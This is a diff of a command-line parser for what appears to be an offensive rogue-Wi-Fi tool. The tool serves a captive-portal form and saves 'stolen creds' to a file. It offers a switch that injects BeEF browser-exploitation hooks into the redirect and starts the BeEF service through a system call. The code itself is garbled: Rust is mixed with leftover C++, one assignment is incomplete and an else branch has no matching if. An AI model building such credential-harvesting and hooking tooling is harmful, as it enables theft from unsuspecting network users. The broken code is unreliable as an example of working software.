@@ -30,32 +30,22 @@ fn parse_commandline_arguments(){
              .short("d")
              .long("document-root")
              .takes_value(str)
-             .help("Five less than your favorite number"))
-    .arg(Arg::with_name("num")
-             .short("n")
-             .long("number")
+             .help("Document Root Location, Relative Path"))
+    .arg(Arg::with_name("External HTML")
+             .short("e")
+             .long("external-html")
              .takes_value(true)
-             .help("Five less than your favorite number"))
-    .arg(Arg::with_name("num")
-             .short("n")
-             .long("number")
+             .help("Boolean switch to serve Document-Root instead of internally generated form "))
+    .arg(Arg::with_name("Beef Hook")
+             .short("b")
+             .long("beef-hook")
              .takes_value(true)
-             .help("Five less than your favorite number"))
-    .arg(Arg::with_name("num")
-             .short("n")
-             .long("number")
+             .help("Boolean switch to serve up beef hooks in the redirect or form"))
+    .arg(Arg::with_name("Captive Portal")
+             .short("p")
+             .long("portal")
              .takes_value(true)
-             .help("Five less than your favorite number"))
-    .arg(Arg::with_name("num")
-             .short("n")
-             .long("number")
-             .takes_value(true)
-             .help("Five less than your favorite number"))
-    .arg(Arg::with_name("num")
-             .short("n")
-             .long("number")
-             .takes_value(true)
-             .help("Five less than your favorite number"))
+             .help("Boolean switch to implement the redirect that is the foundation of a captive portal"))
     .get_commandline_args();
   
 
@@ -67,52 +57,50 @@ fn parse_commandline_arguments(){
 
   }
 
-//
-  let num_str = commandline_args.value_of("port");
-  let num_str = commandline_args.value_of("interface");
-  let num_str = commandline_args.value_of("credentials");
-  let num_str = commandline_args.value_of("document-root");
-  match num_str {
-    None => println!("No idea what your favorite number is."),
+/*Port assignment*/
+
+//TODOTOFU:
+// Blacklist common ports that it would be evil or nonsensical to use
+// Add a blacklist bypass for hackerman
+
+  let port_assignment = commandline_args.value_of("port");
+// match is EXACTLY what it sounds like and does EXACTLY what it looks like... returns
+// TRUE if it matches and runs the subsequent code
+  match port_assignment {
+      // If no data is received
+    None => println!("Need to assign port number!"),
+      // Ohhh look, a bit of data!
     Some(s) => {
         match s.parse::<i32>() {
-            Ok(n) => println!("Your favorite number must be {}.", n + 5),
-            Err(_) => println!("That's not a number! {}", s),
+            // Is this shit right?
+            Ok(n) => println!("Using port {}", s),
+            // OH it AINT RIGHT!?!
+            Err(_) => println!("That's not a good port!! {}", s),
         }
     }
-  }
-      let args: Vec<String> = env::args().collect();
-      let help          = &args[1];    // Shows the help
-      let ADDRESS       = &args[2];    // IP address to use for server
-      let PORT          = &args[3];    // port to use
-      let INTERFACE     = &args[4];    // interface to use in monitor mode
-      let CREDENTIALS   = &args[5];    // filename to save stolen creds to
-      let DOCUMENT_ROOT = &args[6];    // doc root of server
-      let EXTERNAL_HTML = &args[7];    //bool switch for serving external document instead of internal form
-      let BEEF_HOOK     = &args[8];    // switch for beef hook
-      let PORTAL        = &args[9];      // Trigger to actually implement the redirect
-      let TBD           = &args[10];    // TO BE DECIDED
-    try {
-        options::notify(arguments);
-    } catch (std::exception& e) {
-        auto errortext = e.what();
-        errprint(errortext);
-        return 1;
-    };
-    if (arguments.count("help")) {
-        cout << desc << "\n";
-        return 1;
-    };
-    if (arguments.count("portal")) {
-        PORTAL = true;
-    };
-    if (arguments.count("beef-hook")) {
-        hook_location = arguments["address"].as<std::string>();
-        hook_location = hook_location + ":3000";
-        system("service beef start");
+
+
+  let monitor_interface = commandline_args.value_of("Interface");
+
+  let credentials_file = commandline_args.value_of("Credentials File");
+  
+  let DOCUMENT_ROOT = commandline_args.value_of("Document Root");
+  
+  let external_html = commandline_args.value_of("External HTML");
+  
+  let beef_hook = commandline_args.value_of("Beef Hook");
+  hook_location = 
+  hook_location = hook_location + ":3000";
+  system("service beef start");
     } else {
         hook_location = "";
-    };
+    };  
+  
+  
+  let captive_portal = commandline_args.value_of("Captive Portal");
+
+
+
     if (arguments.count("external-html")) {
         //auto pwd = filesystem::current_path();
         //document_root = pwd + arguments
